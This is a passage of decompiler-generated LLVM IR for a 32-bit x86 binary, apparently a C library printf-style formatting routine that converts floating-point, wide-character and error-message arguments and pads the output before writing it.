  %v5_804e455 = icmp eq i8 %v4_804e455, 0
  %v1_804e45a = add i32 %v0_804e2b8.lcssa, 344
  %v2_804e45a = inttoptr i32 %v1_804e45a to i32*
  %v3_804e45a = load i32, i32* %v2_804e45a, align 4
  store i32 %v3_804e45a, i32* %edx.global-to-local, align 4
  br i1 %v5_804e455, label %dec_label_pc_804e467, label %dec_label_pc_804e463

dec_label_pc_804e463:                             ; preds = %dec_label_pc_804e455
  %v1_804e463 = inttoptr i32 %v3_804e45a to x86_fp80*
  %v2_804e463 = load x86_fp80, x86_fp80* %v1_804e463, align 4
  br label %dec_label_pc_804e469

dec_label_pc_804e467:                             ; preds = %dec_label_pc_804e455
  %v1_804e467 = inttoptr i32 %v3_804e45a to double*
  %v2_804e467 = load double, double* %v1_804e467, align 4
  %v3_804e467 = fpext double %v2_804e467 to x86_fp80
  br label %dec_label_pc_804e469

dec_label_pc_804e469:                             ; preds = %dec_label_pc_804e463, %dec_label_pc_804e467
  %storemerge4 = phi x86_fp80 [ %v2_804e463, %dec_label_pc_804e463 ], [ %v3_804e467, %dec_label_pc_804e467 ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_804e469 = load i32, i32* @esi, align 4
  %v2_804e469 = add i32 %v0_804e2b8.lcssa, -4
  %v3_804e469 = inttoptr i32 %v2_804e469 to i32*
  store i32 %v0_804e469, i32* %v3_804e469, align 4
  %v0_804e46a = load i32, i32* @esi, align 4
  %v2_804e46a = add i32 %v0_804e2b8.lcssa, -8
  %v3_804e46a = inttoptr i32 %v2_804e46a to i32*
  store i32 %v0_804e46a, i32* %v3_804e46a, align 4
  %v1_804e46b = add i32 %v0_804e2b8.lcssa, -12
  %v2_804e46b = inttoptr i32 %v1_804e46b to i32*
  store i32 134537518, i32* %v2_804e46b, align 4
  %v1_804e470 = add i32 %v0_804e2b8.lcssa, 20
  store i32 %v1_804e470, i32* %eax.global-to-local, align 4
  %v2_804e474 = add i32 %v0_804e2b8.lcssa, -16
  %v3_804e474 = inttoptr i32 %v2_804e474 to i32*
  store i32 %v1_804e470, i32* %v3_804e474, align 4
  %v1_804e475 = add i32 %v0_804e2b8.lcssa, -28
  %v1_804e478 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804e478 = inttoptr i32 %v1_804e475 to x86_fp80*
  store x86_fp80 %v1_804e478, x86_fp80* %v3_804e478, align 4
  %v1_804e47b = add i32 %v0_804e2b8.lcssa, 368
  %v2_804e47b = inttoptr i32 %v1_804e47b to i32*
  %v3_804e47b = load i32, i32* %v2_804e47b, align 4
  %v5_804e47b = add i32 %v0_804e2b8.lcssa, -32
  %v6_804e47b = inttoptr i32 %v5_804e47b to i32*
  store i32 %v3_804e47b, i32* %v6_804e47b, align 4
  %v0_804e482 = call i32 @_fpmaxtostr()
  store i32 %v0_804e482, i32* %eax.global-to-local, align 4
  %v0_804e487 = load i32, i32* @esp, align 4
  %v1_804e487 = add i32 %v0_804e487, 32
  %v2_804e48a = icmp slt i32 %v0_804e482, 0
  br i1 %v2_804e48a, label %dec_label_pc_804e72b, label %dec_label_pc_804e492

dec_label_pc_804e492:                             ; preds = %dec_label_pc_804e469
  %v1_804e492 = inttoptr i32 %v1_804e487 to i32*
  %v2_804e492 = load i32, i32* %v1_804e492, align 4
  %v4_804e492 = add i32 %v2_804e492, %v0_804e482
  store i32 %v4_804e492, i32* %v1_804e492, align 4
  %v0_804e718.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e718

dec_label_pc_804e49a:                             ; preds = %dec_label_pc_804e450
  %tmp99 = or i32 %v3_804e2b8, 1
  %tmp100 = icmp eq i32 %tmp99, 17
  br i1 %tmp100, label %dec_label_pc_804e4a3, label %dec_label_pc_804e536

dec_label_pc_804e4a3:                             ; preds = %dec_label_pc_804e49a
  %v9_804e49a = icmp eq i32 %v3_804e2b8, 17
  %v1_804e4a3 = add i32 %v0_804e2b8.lcssa, 332
  %v2_804e4a3 = inttoptr i32 %v1_804e4a3 to i32*
  store i32 0, i32* %v2_804e4a3, align 4
  %v0_804e4ae = load i32, i32* @esp, align 4
  %v1_804e4ae = add i32 %v0_804e4ae, 344
  %v2_804e4ae = inttoptr i32 %v1_804e4ae to i32*
  %v3_804e4ae = load i32, i32* %v2_804e4ae, align 4
  store i32 %v3_804e4ae, i32* %edx.global-to-local, align 4
  %v1_804e4b5 = icmp eq i1 %v9_804e49a, false
  br i1 %v1_804e4b5, label %dec_label_pc_804e501, label %dec_label_pc_804e4b7

dec_label_pc_804e4b7:                             ; preds = %dec_label_pc_804e4a3
  %v1_804e4b7 = inttoptr i32 %v3_804e4ae to i32*
  %v2_804e4b7 = load i32, i32* %v1_804e4b7, align 4
  store i32 %v2_804e4b7, i32* %eax.global-to-local, align 4
  %v2_804e4b9 = add i32 %v0_804e4ae, 340
  %v3_804e4b9 = inttoptr i32 %v2_804e4b9 to i32*
  store i32 %v2_804e4b7, i32* %v3_804e4b9, align 4
  %v0_804e4c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4c0 = icmp eq i32 %v0_804e4c0, 0
  br i1 %v1_804e4c0, label %dec_label_pc_804e5b4, label %dec_label_pc_804e4c8

dec_label_pc_804e4c8:                             ; preds = %dec_label_pc_804e4b7
  %v0_804e4c8 = load i32, i32* @esp, align 4
  %v1_804e4c8 = add i32 %v0_804e4c8, 20
  %v2_804e4c8 = inttoptr i32 %v1_804e4c8 to i32*
  %v3_804e4c8 = load i32, i32* %v2_804e4c8, align 4
  store i32 %v3_804e4c8, i32* %eax.global-to-local, align 4
  %v2_804e4cf = icmp slt i32 %v3_804e4c8, 0
  br i1 %v2_804e4cf, label %dec_label_pc_804e4d5, label %dec_label_pc_804e4d3

dec_label_pc_804e4d3:                             ; preds = %dec_label_pc_804e4c8
  br label %dec_label_pc_804e4d5

dec_label_pc_804e4d5:                             ; preds = %dec_label_pc_804e4c8, %dec_label_pc_804e4d3
  %storemerge104 = phi i32 [ %v3_804e4c8, %dec_label_pc_804e4d3 ], [ -1, %dec_label_pc_804e4c8 ]
  store i32 %storemerge104, i32* %ecx.global-to-local, align 4
  %v1_804e4d5 = add i32 %v0_804e4c8, 340
  store i32 %v1_804e4d5, i32* %edx.global-to-local, align 4
  %v1_804e4dc = add i32 %v0_804e4c8, 332
  store i32 %v1_804e4dc, i32* %eax.global-to-local, align 4
  %v2_804e4e3 = add i32 %v0_804e4c8, -4
  %v3_804e4e3 = inttoptr i32 %v2_804e4e3 to i32*
  store i32 %v1_804e4dc, i32* %v3_804e4e3, align 4
  %v0_804e4e4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e4e4 = add i32 %v0_804e4c8, -8
  %v3_804e4e4 = inttoptr i32 %v2_804e4e4 to i32*
  store i32 %v0_804e4e4, i32* %v3_804e4e4, align 4
  %v0_804e4e5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e4e5 = add i32 %v0_804e4c8, -12
  %v3_804e4e5 = inttoptr i32 %v2_804e4e5 to i32*
  store i32 %v0_804e4e5, i32* %v3_804e4e5, align 4
  %v0_804e4e6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e4e6 = add i32 %v0_804e4c8, -16
  %v3_804e4e6 = inttoptr i32 %v2_804e4e6 to i32*
  store i32 %v0_804e4e6, i32* %v3_804e4e6, align 4
  %v0_804e4e7 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e4e7, i32* %eax.global-to-local, align 4
  %v0_804e4ec = load i32, i32* @esp, align 4
  %v1_804e4ec = add i32 %v0_804e4ec, 16
  store i32 %v0_804e4e7, i32* @esi, align 4
  %v10_804e4f1 = icmp eq i32 %v0_804e4e7, -1
  br i1 %v10_804e4f1, label %dec_label_pc_804e72b, label %dec_label_pc_804e4fa

dec_label_pc_804e4fa:                             ; preds = %dec_label_pc_804e4d5
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804e5be

dec_label_pc_804e501:                             ; preds = %dec_label_pc_804e4a3
  %v0_804e501 = load i32, i32* @ebx, align 4
  %v2_804e501 = add i32 %v0_804e4ae, -4
  %v3_804e501 = inttoptr i32 %v2_804e501 to i32*
  store i32 %v0_804e501, i32* %v3_804e501, align 4
  %v1_804e502 = add i32 %v0_804e4ae, 332
  store i32 %v1_804e502, i32* %eax.global-to-local, align 4
  %v2_804e509 = add i32 %v0_804e4ae, -8
  %v3_804e509 = inttoptr i32 %v2_804e509 to i32*
  store i32 %v1_804e502, i32* %v3_804e509, align 4
  %v0_804e50a = load i32, i32* %edx.global-to-local, align 4
  %v1_804e50a = inttoptr i32 %v0_804e50a to i32*
  %v2_804e50a = load i32, i32* %v1_804e50a, align 4
  %v4_804e50a = add i32 %v0_804e4ae, -12
  %v5_804e50a = inttoptr i32 %v4_804e50a to i32*
  store i32 %v2_804e50a, i32* %v5_804e50a, align 4
  %v1_804e50c = add i32 %v0_804e4ae, 204
  store i32 %v1_804e50c, i32* @ebx, align 4
  %v2_804e513 = add i32 %v0_804e4ae, -16
  %v3_804e513 = inttoptr i32 %v2_804e513 to i32*
  store i32 %v1_804e50c, i32* %v3_804e513, align 4
  %v0_804e514 = call i32 @__GI_wcrtomb()
  store i32 %v0_804e514, i32* %eax.global-to-local, align 4
  %v0_804e519 = load i32, i32* @esp, align 4
  %v1_804e519 = add i32 %v0_804e519, 16
  store i32 %v0_804e514, i32* @esi, align 4
  %v10_804e51e = icmp eq i32 %v0_804e514, -1
  br i1 %v10_804e51e, label %dec_label_pc_804e72b, label %dec_label_pc_804e527

dec_label_pc_804e527:                             ; preds = %dec_label_pc_804e501
  %v0_804e527 = load i32, i32* @ebx, align 4
  store i32 %v0_804e527, i32* @edi, align 4
  %v2_804e529 = add i32 %v0_804e514, 220
  %v3_804e529 = add i32 %v2_804e529, %v0_804e519
  %v4_804e529 = inttoptr i32 %v3_804e529 to i8*
  store i8 0, i8* %v4_804e529, align 1
  br label %dec_label_pc_804e5be

dec_label_pc_804e536:                             ; preds = %dec_label_pc_804e49a
  %tmp101 = icmp ult i32 %v3_804e2b8, 20
  br i1 %tmp101, label %dec_label_pc_804e53b, label %dec_label_pc_804e586

dec_label_pc_804e53b:                             ; preds = %dec_label_pc_804e536
  %v9_804e536 = icmp eq i32 %v3_804e2b8, 19
  %v1_804e53b = add i32 %v0_804e2b8.lcssa, 344
  %v2_804e53b = inttoptr i32 %v1_804e53b to i32*
  %v3_804e53b = load i32, i32* %v2_804e53b, align 4
  store i32 %v3_804e53b, i32* %edx.global-to-local, align 4
  %v1_804e542 = icmp eq i1 %v9_804e536, false
  %v1_804e567 = inttoptr i32 %v3_804e53b to i32*
  %v2_804e567 = load i32, i32* %v1_804e567, align 4
  br i1 %v1_804e542, label %dec_label_pc_804e567, label %dec_label_pc_804e544

dec_label_pc_804e544:                             ; preds = %dec_label_pc_804e53b
  store i32 %v2_804e567, i32* @edi, align 4
  %v1_804e546 = icmp eq i32 %v2_804e567, 0
  br i1 %v1_804e546, label %dec_label_pc_804e5b4, label %dec_label_pc_804e54a

dec_label_pc_804e54a:                             ; preds = %dec_label_pc_804e544, %dec_label_pc_804e58f
  %v1_804e557 = phi i32 [ %v0_804e2b8.lcssa, %dec_label_pc_804e544 ], [ %v1_804e5a9, %dec_label_pc_804e58f ]
  %v1_804e54a = add i32 %v1_804e557, 20
  %v2_804e54a = inttoptr i32 %v1_804e54a to i32*
  %v3_804e54a = load i32, i32* %v2_804e54a, align 4
  store i32 %v3_804e54a, i32* %eax.global-to-local, align 4
  %v2_804e551 = icmp slt i32 %v3_804e54a, 0
  br i1 %v2_804e551, label %dec_label_pc_804e557, label %dec_label_pc_804e555

dec_label_pc_804e555:                             ; preds = %dec_label_pc_804e54a
  br label %dec_label_pc_804e557

dec_label_pc_804e557:                             ; preds = %dec_label_pc_804e54a, %dec_label_pc_804e555
  %storemerge = phi i32 [ %v3_804e54a, %dec_label_pc_804e555 ], [ -1, %dec_label_pc_804e54a ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_804e557 = add i32 %v1_804e557, -4
  %v3_804e557 = inttoptr i32 %v2_804e557 to i32*
  store i32 %v3_804e2b8, i32* %v3_804e557, align 4
  %v2_804e558 = add i32 %v1_804e557, -8
  %v3_804e558 = inttoptr i32 %v2_804e558 to i32*
  store i32 %v3_804e2b8, i32* %v3_804e558, align 4
  %v0_804e559 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e559 = add i32 %v1_804e557, -12
  %v3_804e559 = inttoptr i32 %v2_804e559 to i32*
  store i32 %v0_804e559, i32* %v3_804e559, align 4
  %v0_804e55a = load i32, i32* @edi, align 4
  %v2_804e55a = add i32 %v1_804e557, -16
  %v3_804e55a = inttoptr i32 %v2_804e55a to i32*
  store i32 %v0_804e55a, i32* %v3_804e55a, align 4
  %v0_804e55b = call i32 @strnlen()
  store i32 %v0_804e55b, i32* %eax.global-to-local, align 4
  store i32 %v0_804e55b, i32* @esi, align 4
  br label %dec_label_pc_804e5be

dec_label_pc_804e567:                             ; preds = %dec_label_pc_804e53b
  store i32 %v2_804e567, i32* %eax.global-to-local, align 4
  %v1_804e569 = add i32 %v0_804e2b8.lcssa, 204
  store i32 %v1_804e569, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_804e575 = trunc i32 %v2_804e567 to i8
  %v4_804e575 = inttoptr i32 %v1_804e569 to i8*
  store i8 %v1_804e575, i8* %v4_804e575, align 1
  %v0_804e57c = load i32, i32* @esp, align 4
  %v1_804e57c = add i32 %v0_804e57c, 205
  %v2_804e57c = inttoptr i32 %v1_804e57c to i8*
  store i8 0, i8* %v2_804e57c, align 1
  br label %dec_label_pc_804e5be

dec_label_pc_804e586:                             ; preds = %dec_label_pc_804e536
  %v9_804e586 = icmp eq i32 %v3_804e2b8, 20
  %v1_804e589 = icmp eq i1 %v9_804e586, false
  br i1 %v1_804e589, label %dec_label_pc_804e72b, label %dec_label_pc_804e58f

dec_label_pc_804e58f:                             ; preds = %dec_label_pc_804e586
  %v0_804e58f = load i32, i32* %stack_var_-364, align 4
  %v1_804e58f = call i32 @__errno_location(i32 %v0_804e58f)
  store i32 %v1_804e58f, i32* %eax.global-to-local, align 4
  %v0_804e594 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e594 = load i32, i32* @esp, align 4
  %v2_804e594 = add i32 %v1_804e594, -4
  %v3_804e594 = inttoptr i32 %v2_804e594 to i32*
  store i32 %v0_804e594, i32* %v3_804e594, align 4
  %v1_804e595 = add i32 %v1_804e594, -8
  %v2_804e595 = inttoptr i32 %v1_804e595 to i32*
  store i32 128, i32* %v2_804e595, align 4
  %v1_804e59a = add i32 %v1_804e594, 204
  store i32 %v1_804e59a, i32* %edx.global-to-local, align 4
  %v2_804e5a1 = add i32 %v1_804e594, -12
  %v3_804e5a1 = inttoptr i32 %v2_804e5a1 to i32*
  store i32 %v1_804e59a, i32* %v3_804e5a1, align 4
  %v1_804e5a2 = inttoptr i32 %v1_804e58f to i32*
  %v2_804e5a2 = load i32, i32* %v1_804e5a2, align 4
  %v4_804e5a2 = add i32 %v1_804e594, -16
  %v5_804e5a2 = inttoptr i32 %v4_804e5a2 to i32*
  store i32 %v2_804e5a2, i32* %v5_804e5a2, align 4
  %v0_804e5a4 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804e5a4, i32* %eax.global-to-local, align 4
  %v0_804e5a9 = load i32, i32* @esp, align 4
  %v1_804e5a9 = add i32 %v0_804e5a9, 16
  store i32 %v0_804e5a4, i32* @edi, align 4
  br label %dec_label_pc_804e54a

dec_label_pc_804e5b0:                             ; preds = %dec_label_pc_804e43f, %dec_label_pc_804e438, %dec_label_pc_804e425
  %v0_804e5ca36 = phi i32 [ %v1_804e3cb, %dec_label_pc_804e43f ], [ 0, %dec_label_pc_804e438 ], [ 5, %dec_label_pc_804e425 ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e5ca

dec_label_pc_804e5b4:                             ; preds = %dec_label_pc_804e544, %dec_label_pc_804e4b7
  store i32 ptrtoint ([7 x i8]* @global_var_80561de.193 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_804e5be

dec_label_pc_804e5be:                             ; preds = %dec_label_pc_804e567, %dec_label_pc_804e557, %dec_label_pc_804e527, %dec_label_pc_804e4fa, %dec_label_pc_804e5b4
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_804e5c5 = load i32, i32* @esp, align 4
  %v1_804e5c5 = add i32 %v0_804e5c5, 7
  %v2_804e5c5 = inttoptr i32 %v1_804e5c5 to i8*
  store i8 32, i8* %v2_804e5c5, align 1
  %v0_804e5ca.pre = load i32, i32* @esi, align 4
  %v1_804e5ca.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e5ca

dec_label_pc_804e5ca:                             ; preds = %dec_label_pc_804e5b0, %dec_label_pc_804e447, %dec_label_pc_804e5be
  %v1_804e5ca = phi i32 [ 0, %dec_label_pc_804e5b0 ], [ %v2_804e43f, %dec_label_pc_804e447 ], [ %v1_804e5ca.pre, %dec_label_pc_804e5be ]
  %v0_804e5ca = phi i32 [ %v0_804e5ca36, %dec_label_pc_804e5b0 ], [ %v1_804e3cb, %dec_label_pc_804e447 ], [ %v0_804e5ca.pre, %dec_label_pc_804e5be ]
  %v2_804e5ca = add i32 %v0_804e5ca, %v1_804e5ca
  store i32 %v2_804e5ca, i32* @edx, align 4
  %v0_804e5cd = load i32, i32* @ebp, align 4
  %v9_804e5cd = icmp eq i32 %v0_804e5cd, 11
  br i1 %v9_804e5cd, label %dec_label_pc_804e5de, label %dec_label_pc_804e5d2

dec_label_pc_804e5d2:                             ; preds = %dec_label_pc_804e5ca
  %v1_804e5d4 = add i32 %v0_804e5cd, -5
  %v6_804e5d4 = sub i32 4, %v0_804e5cd
  %v7_804e5d4 = and i32 %v6_804e5d4, %v0_804e5cd
  %v8_804e5d4 = icmp slt i32 %v7_804e5d4, 0
  %v9_804e5d4 = icmp eq i32 %v1_804e5d4, 0
  %v10_804e5d4 = icmp slt i32 %v1_804e5d4, 0
  %v3_804e5d7 = icmp eq i1 %v10_804e5d4, %v8_804e5d4
  %v4_804e5d7 = icmp eq i1 %v9_804e5d4, false
  %v5_804e5d7 = and i1 %v4_804e5d7, %v3_804e5d7
  %v6_804e5d7 = zext i1 %v5_804e5d7 to i32
  store i32 %v6_804e5d7, i32* %eax.global-to-local, align 4
  %v2_804e5da = add i32 %v2_804e5ca, 1
  %v3_804e5da = add i32 %v2_804e5da, %v6_804e5d7
  store i32 %v3_804e5da, i32* @edx, align 4
  br label %dec_label_pc_804e5de

dec_label_pc_804e5de:                             ; preds = %dec_label_pc_804e5ca, %dec_label_pc_804e5d2
  %v0_804e5de = load i32, i32* @esp, align 4
  %v1_804e5de = add i32 %v0_804e5de, 24
  %v2_804e5de = inttoptr i32 %v1_804e5de to i32*
  %v3_804e5de = load i32, i32* %v2_804e5de, align 4
  store i32 %v3_804e5de, i32* %eax.global-to-local, align 4
  %v1_804e5e2 = add i32 %v0_804e5de, 8
  %v2_804e5e2 = inttoptr i32 %v1_804e5e2 to i32*
  store i32 0, i32* %v2_804e5e2, align 4
  %v0_804e5ea = load i32, i32* %eax.global-to-local, align 4
  %v1_804e5ea = load i32, i32* @edx, align 4
  %v2_804e5ea = sub i32 %v0_804e5ea, %v1_804e5ea
  %v7_804e5ea = icmp ult i32 %v0_804e5ea, %v1_804e5ea
  %v12_804e5ea = icmp eq i32 %v2_804e5ea, 0
  %v2_804e5ec = or i1 %v7_804e5ea, %v12_804e5ea
  br i1 %v2_804e5ec, label %dec_label_pc_804e5f4, label %dec_label_pc_804e5ee

dec_label_pc_804e5ee:                             ; preds = %dec_label_pc_804e5de
  store i32 %v2_804e5ea, i32* %eax.global-to-local, align 4
  %v1_804e5f0 = load i32, i32* @esp, align 4
  %v2_804e5f0 = add i32 %v1_804e5f0, 8
  %v3_804e5f0 = inttoptr i32 %v2_804e5f0 to i32*
  store i32 %v2_804e5ea, i32* %v3_804e5f0, align 4
  %v0_804e5f8.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e5f4

dec_label_pc_804e5f4:                             ; preds = %dec_label_pc_804e5de, %dec_label_pc_804e5ee
  %v0_804e5f8 = phi i32 [ %v1_804e5ea, %dec_label_pc_804e5de ], [ %v0_804e5f8.pre, %dec_label_pc_804e5ee ]
  %v0_804e5f4 = load i32, i32* @esp, align 4
  %v1_804e5f4 = add i32 %v0_804e5f4, 8
  %v2_804e5f4 = inttoptr i32 %v1_804e5f4 to i32*
  %v3_804e5f4 = load i32, i32* %v2_804e5f4, align 4
  store i32 %v3_804e5f4, i32* @ecx, align 4
  %v2_804e5f8 = add i32 %v3_804e5f4, %v0_804e5f8
  store i32 %v2_804e5f8, i32* %eax.global-to-local, align 4
  %v1_804e5fb = inttoptr i32 %v0_804e5f4 to i32*
  %v2_804e5fb = load i32, i32* %v1_804e5fb, align 4
  %v4_804e5fb = add i32 %v2_804e5fb, %v2_804e5f8
  store i32 %v4_804e5fb, i32* %v1_804e5fb, align 4
  %v0_804e5fe = load i32, i32* @esp, align 4
  %v1_804e5fe = add i32 %v0_804e5fe, 7
  %v2_804e5fe = inttoptr i32 %v1_804e5fe to i8*
  %v3_804e5fe = load i8, i8* %v2_804e5fe, align 1
  %v9_804e5fe = icmp eq i8 %v3_804e5fe, 48
  %v1_804e603 = icmp eq i1 %v9_804e5fe, false
  br i1 %v1_804e603, label %dec_label_pc_804e60f, label %dec_label_pc_804e605

dec_label_pc_804e605:                             ; preds = %dec_label_pc_804e5f4
  %v0_804e605 = load i32, i32* @ebx, align 4
  %v1_804e605 = load i32, i32* @ecx, align 4
  %v2_804e605 = add i32 %v1_804e605, %v0_804e605
  store i32 %v2_804e605, i32* @ebx, align 4
  %v1_804e607 = add i32 %v0_804e5fe, 8
  %v2_804e607 = inttoptr i32 %v1_804e607 to i32*
  store i32 0, i32* %v2_804e607, align 4
  %v0_804e60f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e60f

dec_label_pc_804e60f:                             ; preds = %dec_label_pc_804e5f4, %dec_label_pc_804e605
  %v0_804e616 = phi i32 [ %v0_804e5fe, %dec_label_pc_804e5f4 ], [ %v0_804e60f.pre, %dec_label_pc_804e605 ]
  %v1_804e60f = add i32 %v0_804e616, 32
  %v2_804e60f = inttoptr i32 %v1_804e60f to i8*
  %v3_804e60f = load i8, i8* %v2_804e60f, align 1
  %v4_804e60f = and i8 %v3_804e60f, 8
  %v5_804e60f = icmp eq i8 %v4_804e60f, 0
  %v1_804e614 = icmp eq i1 %v5_804e60f, false
  br i1 %v1_804e614, label %dec_label_pc_804e63d, label %dec_label_pc_804e616

dec_label_pc_804e616:                             ; preds = %dec_label_pc_804e60f
  %v1_804e616 = add i32 %v0_804e616, 8
  %v2_804e616 = inttoptr i32 %v1_804e616 to i32*
  %v3_804e616 = load i32, i32* %v2_804e616, align 4
  store i32 %v3_804e616, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e61f = add i32 %v0_804e616, 368
  %v2_804e61f = inttoptr i32 %v1_804e61f to i32*
  %v3_804e61f = load i32, i32* %v2_804e61f, align 4
  store i32 %v3_804e61f, i32* @eax, align 4
  %v0_804e626 = call i32 @_charpad()
  store i32 %v0_804e626, i32* %eax.global-to-local, align 4
  %v1_804e62b = load i32, i32* @esp, align 4
  %v2_804e62b = add i32 %v1_804e62b, 8
  %v3_804e62b = inttoptr i32 %v2_804e62b to i32*
  %v4_804e62b = load i32, i32* %v3_804e62b, align 4
  %v15_804e62b = icmp eq i32 %v0_804e626, %v4_804e62b
  %v1_804e62f = icmp eq i1 %v15_804e62b, false
  br i1 %v1_804e62f, label %dec_label_pc_804e72b, label %dec_label_pc_804e635

dec_label_pc_804e635:                             ; preds = %dec_label_pc_804e616
  store i32 0, i32* %v3_804e62b, align 4
  %v1_804e63d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e63d

dec_label_pc_804e63d:                             ; preds = %dec_label_pc_804e60f, %dec_label_pc_804e635
  %v1_804e63d = phi i32 [ %v0_804e616, %dec_label_pc_804e60f ], [ %v1_804e63d.pre, %dec_label_pc_804e635 ]
  %v0_804e63d = load i32, i32* %eax.global-to-local, align 4
  %v2_804e63d = add i32 %v1_804e63d, -4
  %v3_804e63d = inttoptr i32 %v2_804e63d to i32*
  store i32 %v0_804e63d, i32* %v3_804e63d, align 4
  %v0_804e63e = load i32, i32* %eax.global-to-local, align 4
  %v2_804e63e = add i32 %v1_804e63d, -8
  %v3_804e63e = inttoptr i32 %v2_804e63e to i32*
  store i32 %v0_804e63e, i32* %v3_804e63e, align 4
  %v1_804e63f = add i32 %v1_804e63d, 368
  %v2_804e63f = inttoptr i32 %v1_804e63f to i32*
  %v3_804e63f = load i32, i32* %v2_804e63f, align 4
  %v5_804e63f = add i32 %v1_804e63d, -12
  %v6_804e63f = inttoptr i32 %v5_804e63f to i32*
  store i32 %v3_804e63f, i32* %v6_804e63f, align 4
  %v0_804e646 = load i32, i32* @ebp, align 4
  %v1_804e646 = add i32 %v0_804e646, ptrtoint (i32* @global_var_80561e5.194 to i32)
  store i32 %v1_804e646, i32* %eax.global-to-local, align 4
  %v2_804e64c = add i32 %v1_804e63d, -16
  %v3_804e64c = inttoptr i32 %v2_804e64c to i32*
  store i32 %v1_804e646, i32* %v3_804e64c, align 4
  %v0_804e64d = load i32, i32* %stack_var_-364, align 4
  %v4_804e64d = inttoptr i32 %v0_804e64d to i8*
  %v5_804e64d = call i32 @__GI_fputs_unlocked(i8* %v4_804e64d, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804e64d, i32* %eax.global-to-local, align 4
  %v0_804e652 = load i32, i32* @esp, align 4
  %v1_804e652 = add i32 %v0_804e652, 384
  %v2_804e652 = inttoptr i32 %v1_804e652 to i32*
  %v3_804e652 = load i32, i32* %v2_804e652, align 4
  store i32 %v3_804e652, i32* @eax, align 4
  %v0_804e659 = load i32, i32* @ebx, align 4
  store i32 %v0_804e659, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804e660 = call i32 @_charpad()
  store i32 %v0_804e660, i32* %eax.global-to-local, align 4
  %v0_804e665 = load i32, i32* @esp, align 4
  %v1_804e665 = add i32 %v0_804e665, 16
  %v1_804e668 = load i32, i32* @ebx, align 4
  %v12_804e668 = icmp eq i32 %v0_804e660, %v1_804e668
  %v1_804e66a = icmp eq i1 %v12_804e668, false
  br i1 %v1_804e66a, label %dec_label_pc_804e72b, label %dec_label_pc_804e670

dec_label_pc_804e670:                             ; preds = %dec_label_pc_804e63d
  %v1_804e670 = add i32 %v0_804e665, 356
  %v2_804e670 = inttoptr i32 %v1_804e670 to i32*
  %v3_804e670 = load i32, i32* %v2_804e670, align 4
  %v4_804e670 = icmp eq i32 %v3_804e670, 0
  %v1_804e678 = icmp eq i1 %v4_804e670, false
  br i1 %v1_804e678, label %dec_label_pc_804e69c, label %dec_label_pc_804e67a

dec_label_pc_804e67a:                             ; preds = %dec_label_pc_804e670
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804e67c = load i32, i32* @esi, align 4
  %v1_804e67c = icmp eq i32 %v0_804e67c, 0
  br i1 %v1_804e67c, label %dec_label_pc_804e692.thread, label %dec_label_pc_804e692

dec_label_pc_804e692.thread:                      ; preds = %dec_label_pc_804e67a
  br label %dec_label_pc_804e6fd

dec_label_pc_804e692:                             ; preds = %dec_label_pc_804e67a
  %v2_804e680 = add i32 %v0_804e665, 12
  %v3_804e680 = inttoptr i32 %v2_804e680 to i32*
  store i32 0, i32* %v3_804e680, align 4
  %v1_804e681 = add i32 %v0_804e665, 384
  %v2_804e681 = inttoptr i32 %v1_804e681 to i32*
  %v3_804e681 = load i32, i32* %v2_804e681, align 4
  %v5_804e681 = add i32 %v0_804e665, 8
  %v6_804e681 = inttoptr i32 %v5_804e681 to i32*
  store i32 %v3_804e681, i32* %v6_804e681, align 4
  %v0_804e688 = load i32, i32* @esi, align 4
  %v2_804e688 = add i32 %v0_804e665, 4
  %v3_804e688 = inttoptr i32 %v2_804e688 to i32*
  store i32 %v0_804e688, i32* %v3_804e688, align 4
  %v0_804e689 = load i32, i32* @edi, align 4
  %v3_804e689 = inttoptr i32 %v0_804e665 to i32*
  store i32 %v0_804e689, i32* %v3_804e689, align 4
  %v0_804e68a = load i32, i32* %stack_var_-364, align 4
  %v4_804e68a = call i32 @__stdio_fwrite(i32 %v0_804e68a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e68a, i32* %eax.global-to-local, align 4
  %v0_804e68f = load i32, i32* @esp, align 4
  %v1_804e68f = add i32 %v0_804e68f, 16
  %v1_804e692.pre = load i32, i32* @esi, align 4
  %v12_804e692 = icmp eq i32 %v4_804e68a, %v1_804e692.pre
  %v1_804e694 = icmp eq i1 %v12_804e692, false
  br i1 %v1_804e694, label %dec_label_pc_804e72b, label %dec_label_pc_804e6fd

dec_label_pc_804e69c:                             ; preds = %dec_label_pc_804e670
  %v1_804e69c = add i32 %v0_804e665, 348
  %v2_804e69c = inttoptr i32 %v1_804e69c to i32*
  store i32 0, i32* %v2_804e69c, align 4
  %v0_804e6f97 = load i32, i32* @esi, align 4
  %v1_804e6f98 = icmp eq i32 %v0_804e6f97, 0
  %v1_804e6fb15 = icmp eq i1 %v1_804e6f98, false
  br i1 %v1_804e6fb15, label %dec_label_pc_804e6a9, label %dec_label_pc_804e69c.dec_label_pc_804e6fd.loopexit_crit_edge

